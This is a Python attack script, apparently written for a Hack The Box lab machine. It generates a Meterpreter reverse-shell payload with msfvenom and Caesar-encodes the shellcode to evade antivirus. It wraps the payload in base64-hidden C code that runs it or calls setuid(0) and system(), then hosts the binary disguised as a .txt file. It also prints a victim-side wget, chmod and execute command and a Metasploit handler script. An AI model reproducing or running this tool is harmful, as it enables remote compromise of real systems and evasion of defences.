import os,sys
import base64
import argparse
from random import choice

stage_encoding = "0" #"0" #"1"

obfuscate_bin = "1" #"0" "1"

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def copy(runfilename,payfilepath,payfilename):
    os.system("cp %s %s%s" % (runfilename,payfilepath,payfilename))
    print ('[+] %s copied to %s%s' % (runfilename,payfilepath,payfilename))
    pass

def resourcefile(msf_payload,lhost,lport,bitness):
    rcfilename = "linux.rc"
    with open(rcfilename,'w') as f:
        f.write("use exploit/multi/handler" + "\n")
        f.write("set payload %s\n" % msf_payload)
        f.write("set lhost %s\n" % lhost)
        f.write("set lport %s\n" % lport)
        if stage_encoding == "1":
            f.write("set EnableStageEncoding true\n")
            if bitness == "64": 
                f.write("set StageEncoder x64/zutto_dekiru\n") # only if x64
                print('[!] warning: "StageEncoder x64/zutto_dekiru" in use')
        f.write("run\n")
    f.close()
    print ('[+] msf resource script written: %s -> use:\nsudo msfconsole -r %s [or] resource %s' % (rcfilename,rcfilename,rcfilename))
    pass

def genlinux(lhost,lport,bitness,pformat):
    msf_payload = "linux/x64/meterpreter/reverse_tcp"
    if bitness == "32":
        msf_payload = "linux/meterpreter/reverse_tcp"
    cmd = "msfvenom -p "+msf_payload+" LHOST="+lhost+" LPORT="+lport+" EXITFUNC=thread -f "+pformat+" -o met"+bitness+"."+pformat+""
    os.system(cmd)
    #print (cmd)
    print ('[+] met generated: lhost %s, lport %s, bitness %s, format %s' % (lhost,lport,bitness,pformat))
    print ('[!] msfvenom: %s' % cmd)
    resourcefile(msf_payload,lhost,lport,bitness)
    pass

def bxor(b1, b2):
    res = bytes([_a ^ _b for _a, _b in zip(b1, b2)])
    res = "{:02x}".format(ord(res))
    res = "\\x" + res
    return res

def bcaesar(b1,b2):
    res = b1 + b2
    res = int(res)
    res = res & 0xff
    res = hex(res).split('x')[-1]
    if len(res) == 1:
        res = "0" + res
    #print((res))
    return res

def caesar_buffer_c(bufferstring):
    '''
    int main (int argc, char **argv)
    {
        //caesar with key '+8'
        int caesar_key = 8;
        int payload_length = (int) sizeof(buf);
        for (int i=0; i<payload_length; i++)
        {
            printf("\\x%02X",(buf[i] + caesar_key) & 0xFF);
        }
        return 0;
    }
    '''
    m = bufferstring.split("\n")
    #print(m)
    mheader = "unsigned char buf[] =\n"
    mpayload = m[1:-1]
    mtail = "\";\n"
    #print (mheader)
    #print (mpayload)
    mbytes = []
    for nbytes in mpayload:
        nbytes = nbytes[1:-1]
        nbytes = nbytes.split('\\x')[1:]
        nbytes = [x.strip() for x in nbytes]
        nbytes = [x.replace('"','') for x in nbytes]
        for obyte in nbytes:
            mbytes.append(obyte)
        #print (nbytes)
    #print (mbytes)
    mres = []
    #xorkey = bytes.fromhex("fa")
    caesarkey = 8
    count = 1
    for byte in mbytes:
        #print (byte)
        tmp = byte
        #print (tmp)
        if len(tmp) == 1:
            tmp = "0" + tmp
        #print (tmp)
        #tmp = bytes.fromhex(tmp)
        tmp = int(tmp,16)
        #res = bxor(tmp,xorkey)
        res = bcaesar(tmp,caesarkey)
        res = "\\x%s" % res
        #print(res)
        if count == 1:
            res = "\"" + res
        if count == 15:
            res = res + "\"\n" #.decode('iso8859-1') #.encode('ASCII') #'latin1'
            count = 0
        count += 1
        mres.append(res)
    #print (mres)
    msfres = "".join(mres)
    buflen = len(mres)
    mheader = mheader #% str(buflen)
    msfres = mheader + msfres + mtail#'''
    #print (msfres)
    return msfres
    pass

def writewrap(bitness,lhost,lport,shcmd):
    wrapfilename = "wrap.c"

    if shcmd == "0":
        upper = "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKLy9zdWRvIG1zZnZlbm9tIC1wIGxpbnV4L3g2NC9tZXRlcnByZXRlci9yZXZlcnNlX3RjcCBsaG9zdD0xMC4xMC4xNC4zMSBscG9ydD00NDMgZXhpdGZ1bmM9dGhyZWFkIC1mIGMgLW8gbWV0NjQuYwovL2NhZXNhciB3aXRoIGtleSAiKzgi"
        lower = "aW50IG1haW4gKGludCBhcmdjLCBjaGFyICoqYXJndikKewogICAgLy9kZWNvZGUgc2hlbGxjb2RlIGFjY29yZGluZ2x5ICh4b3Igb3IgY2Flc2FyKQogICAgLy9jaGFyIHhvcl9rZXkgPSAnSic7CiAgICBpbnQgY2Flc2FyX2tleSA9IDg7CiAgICBpbnQgYXJyYXlzaXplID0gKGludCkgc2l6ZW9mKGJ1Zik7CiAgICBmb3IgKGludCBpPTA7IGk8YXJyYXlzaXplLTE7IGkrKykgCiAgICB7CiAgICAgICAgLy9idWZbaV0gPSBidWZbaV1eeG9yX2tleTsKICAgICAgICBidWZbaV0gPSAoYnVmW2ldIC0gY2Flc2FyX2tleSkgJiAweEZGOwogICAgfQoKICAgIC8vcnVuIG91ciBzaGVsbGNvZGUKICAgIGludCAoKnJldCkoKSA9IChpbnQoKikoKSlidWY7CiAgICByZXQoKTsKfQ=="

        msffilename = "met%s.c" % (bitness)
        m = open(msffilename,'r')
        msf = m.read()
        m.close()
        #print(msf)
        msf = caesar_buffer_c(msf) # 5/26 -defender
        #print(msf) 

    if shcmd != "0":
        print('[+] shcmd: %s' % shcmd)
        upper = "I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKdm9pZCBtYWluICgpCnsKICAgIHNldHVpZCgwKTsKICAgIHNldGdpZCgwKTs="
        lower = "fQ=="

        msf = "system(\"%s\");" % shcmd

    with open(wrapfilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("    " + msf + "\n")
        f.write(lower)
    f.close()

    print('[+] wrap c written: %s' % wrapfilename)
    return wrapfilename
    pass

def makewrap(bitness,lhost,lport,shcmd):
    if shcmd == "0":
        genlinux(lhost,lport,bitness,"c")
    haxfilename = writewrap(bitness,lhost,lport,shcmd)
    haxfilenamereal = haxfilename.split(".")[0].strip()

    binwebroot = "/var/www/html/"
    if obfuscate_bin == "0":
        binfilename = "%s.o" % haxfilenamereal
        binrandfilename = "%s.o" % rand_word()
    if obfuscate_bin == "1":
        binfilename = "%s.txt" % haxfilenamereal
        binrandfilename = "%s.txt" % rand_word()

    compilebin = "gcc -o %s.o %s.c -z execstack" % (haxfilenamereal,haxfilenamereal)
    os.system(compilebin)
    print('[+] %s.o compiled: %s.o' % (haxfilenamereal,haxfilenamereal))

    if obfuscate_bin == "0":
        copy(haxfilenamereal+".o",binwebroot,haxfilenamereal+".o")
    if obfuscate_bin == "1":
        copy(haxfilenamereal+".o",binwebroot,binfilename)

    # switch SSH target accordingly!
    scpcmd = "scp -i ~/htb/labs/book/ssh/reader.pem ./%s.o reader@book.htb:/home/reader/" % haxfilenamereal
    print('[+] upload:\nupload %s%s' % (binwebroot,binfilename))
    print(scpcmd)

    runcmd = "wget http://%s/%s -O /tmp/%s;chmod 777 /tmp/%s;/tmp/%s" % (lhost,binfilename,binrandfilename,binrandfilename,binrandfilename)
    print('[+] upload and use: (victim side)')
    print(runcmd)

    cleanupcmd = "rm /tmp/%s" % binfilename
    cleanupcmd_rand = "rm /tmp/%s" % binrandfilename
    print('[+] cleanup:')
    print(cleanupcmd)
    print(cleanupcmd_rand)

    pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--cmd','-c',required=False,dest='shcmd',help='shell command')
    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    shcmd = args.shcmd

    if shcmd == None:
        shcmd = "0"

    #writewrap(bitness,lhost,lport,shcmd)
    makewrap(bitness,lhost,lport,shcmd)